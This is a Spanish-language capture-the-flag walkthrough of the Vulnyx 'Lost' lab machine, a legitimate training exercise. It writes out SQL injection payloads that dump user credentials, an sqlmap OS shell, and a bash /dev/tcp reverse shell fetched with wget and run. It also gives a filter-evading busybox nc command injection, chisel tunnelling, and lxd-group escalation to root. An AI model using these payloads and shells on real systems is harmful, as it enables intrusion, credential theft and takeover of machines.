# Vulnyx - Lost

## Escaneo de Red y Descubrimiento de Servicios

Se realizó un escaneo de red y descubrimiento de servicios en el host "(IP-victima)" utilizando las siguientes herramientas:

```bash
arp-scan -I eth0 --localnet
(IP-Victima)
nmap -p 22,80 -sS -sC -sV -n -Pn (IP-victima) -oN nmap
```

Los resultados indican la presencia de servicios SSH y HTTP con detalles sobre las versiones y el título de la página web.

```plaintext
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
http-title: lost.nyx
```

## Enumeración de Subdominios y Configuración de /etc/hosts

Se enlazo la IP-victima con "lost.nyx" en "/etc/hosts" y se procedió a la enumeración de subdominios utilizando wfuzz y se identificó un subdominio llamado "dev".

```bash
wfuzz --hc=404 --hl=34 -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -H 'host: FUZZ.lost.nyx' -u (IP-victima)4
```

Al encontrar "dev" como un subdominio, se agregó la entrada correspondiente en el archivo "/etc/hosts".

## Exploración del Blog y Descubrimiento de una Vulnerabilidad SQL

Se encontró una sección llamada "passengers list" en el blog, que permite acceder a información mediante IDs.

```plaintext
http://dev.lost.nyx/passengers.php?id=1
```

Después de detectar un error de SQL al ingresar una comilla (') en el parámetro, se sospecha de una vulnerabilidad SQL. Se realizó una inyección SQL con éxito:

```plaintext
http://dev.lost.nyx/passengers.php?id=1 or 1=1 -- -
```

## Extracción de Datos de la Base de Datos

Se realizó una serie de inyecciones SQL para obtener información sobre la base de datos:

```plaintext
http://dev.lost.nyx/passengers.php?id=1 union select schema_name,2,3,4 from information_schema.schemata-- -
http://dev.lost.nyx/passengers.php?id=1 union select table_name,2,3,4 from information_schema.tables-- -
#users
http://dev.lost.nyx/passengers.php?id=1 union select column_name,2,3,4 from information_schema.columns where table_name = 'users'-- -
#username
#password
http://dev.lost.nyx/passengers.php?id=1 union select username,password,2,3 from users-- -
```

Esto permitió identificar la existencia de una tabla llamada "users" con las columnas "id", "username", "salt" y "password".

## Obtención y Filtrado de Credenciales

Las credenciales de los usuarios se obtuvieron mediante la inyección SQL y se almacenaron en un archivo llamado "pass". Luego se filtraron y formatearon:

```bash
nano pass  # Pegar usuarios y contraseñas
cat pass | awk '{print $1 ":::" $2}' > hashes
```

## Decodificación de Contraseñas

Se intentó decodificar las contraseñas utilizando base64, pero se encontraron problemas. Se buscará una alternativa para la decodificación.

```bash
# Intento de decodificación con base64 (no exitoso)
```

La investigación continúa para encontrar una solución adecuada para la decodificación de las contraseñas.

# Obtención de Shell y Exploración de la Red en Lost.nyx

## Generación de Shell con SQLMap

Después de identificar una vulnerabilidad de inyección SQL en el sitio web "dev.lost.nyx," se utilizó SQLMap para obtener una shell en la máquina víctima.

```bash
sqlmap -u "http://dev.lost.nyx/passengers.php?id=1" -p id --os-shell
whoami
# Resultado: www-data
```

## Creación de Reverse Shell y Acceso Remoto

Se procedió a crear una reverse shell para facilitar el acceso remoto a la máquina víctima. Se creó un script llamado "rev.sh" con el siguiente contenido:

```bash
bash -i >& /dev/tcp/(IP-acatante)/443 0>&1
python3 -m http.server 8000
```

Luego, se estableció un servidor HTTP en la máquina atacante y se puso en escucha con Netcat en el puerto 443. En la máquina víctima, se descargó y ejecutó el script.

```bash
wget http://(IP-acatante):8000/rev.sh
chmod 777 rev.sh
bash rev.sh
```

Esto resultó en la obtención de una reverse shell en la máquina atacante via netcat por el puerto 443.

```bash
nc -nlvc 443
```

## TTY Handling y Descubrimiento de Puertos Ocultos

Dentro de la shell, se realizaron acciones para mejorar la TTY y se identificaron puertos que no se mostraban en el escaneo inicial con nmap.

```bash
script /dev/null -c bash
Control+Z
stty raw -echo; fg
reset xtermcd
export TERM=xterm
export SHELL=bash

ss -tuln
```

Se descubrió un puerto oculto "3000" que no aparecía en el escaneo inicial.

```plaintext
tcp    LISTEN  0       4096         127.0.0.1:3000        0.0.0.0:*
```

## Uso de Chisel para Enlazar Puertos

Se utilizó Chisel para crear un conducto y enlazar el puerto "3000" de la máquina víctima al puerto "3000" de la máquina atacante.

**Máquina atacante, en distintas shells:**
```bash
#shell 1:
python3 -m http.server 8000
#shell 2:
./chisel server --reverse -p 4000
```

**Máquina víctima:**
```bash
wget http://(IP-acatante):8000/chisel
chmod 777 chisel
./chisel client 192.168.200.5:4000 R:3000:127.0.0.1:3000
```

Ahora se puede acceder al puerto "3000" de la máquina víctima a través del navegador en la máquina atacante.
```plaintext
http://localhost:3000
```

Este proceso proporciona un canal seguro para interactuar con el servicio en el puerto "3000" de la máquina víctima.

# Escalada de Privilegios en Lost.nyx - Continuación

## Acceso a un Panel de Ejecución de Comandos

Al acceder a la URL [http://127.0.0.1:3000](http://127.0.0.1:3000), se descubre un panel que permite la ejecución de comandos. Se utilizó la técnica de inyección de comandos, introduciendo "|" antes de cada comando para eludir las restricciones.

```plaintext
|whoami
# Resultado: jackshephard
```

## Ganar Acceso a la Máquina mediante Reverse Shell

Se logró el acceso a la máquina mediante la siguiente inyección:

```plaintext
busybox${IFS}nc${IFS}(IP-acatante)${IFS}6969${IFS}-e${IFS}sh
```

[Fuente](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

Luego, se realizó el tratamiento de TTY para mejorar la interactividad de la shell.

```bash
script /dev/null -c bash
Control+Z
stty raw -echo; fg
reset xtermcd 
export TERM=xterm
export SHELL=bash
```

## Enumeración de Privilegios y Descubrimiento del Grupo "lxd"

La enumeración de privilegios reveló la pertenencia al grupo "lxd."

```plaintext
id
# Resultado: uid=1000(jackshephard) gid=1000(jackshephard) groups=1000(jackshephard),111(lxd)
```

## Escalada de Privilegios Utilizando el Grupo "lxd"

Siguiendo los pasos de [abusando-grupo-lxd-lxc](https://j4ckie0x17.gitbook.io/notes-pentesting/escalada-de-privilegios/linux/abusando-grupo-lxd-lxc), se procedió a crear una imagen Alpine en la máquina atacante y transferirla a la máquina víctima.

```bash
#Maquina atacante:
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine
python3 -m http.server 8000
```

La imagen Alpine fue descargada en la máquina víctima y se procedió a realizar la escalada de privilegios.

```bash
#Maquina victima:
#Obtenemos la imagen
wget http://(IP-acatante):8000/alpine-v3.19-x86_64-20240303_1743.tar.gz
#Importamos
lxc image import alpine-v3.19-x86_64-20240303_1743.tar.gz --alias
#Aseguramos su correcta importacion
lxc image list
#Iniciamos y damos privilegios de root
lxc init alpine privesc -c security.privileged=true 
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
#Iniciamos y ejecutamos
lxc start privesc
lxc exec privesc sh
cd /mnt/root
whoami
# Resultado: root
```

Ahora, el contenido de la máquina víctima se encuentra en un contenedor con privilegios de root. :D

## Reconocimientos

Haber podido realizar esta maquina no hubiese sido posible sin los siguientes creadores. Si quieren una explicacion mas detallada vean sus videos:

- [Jackie0x17 - Video Tutorial](https://www.youtube.com/watch?v=ikrLt38_MY8)
- [El pinguino de mario - Video Tutorial](https://www.youtube.com/watch?v=Eyq1K2UHy7A)
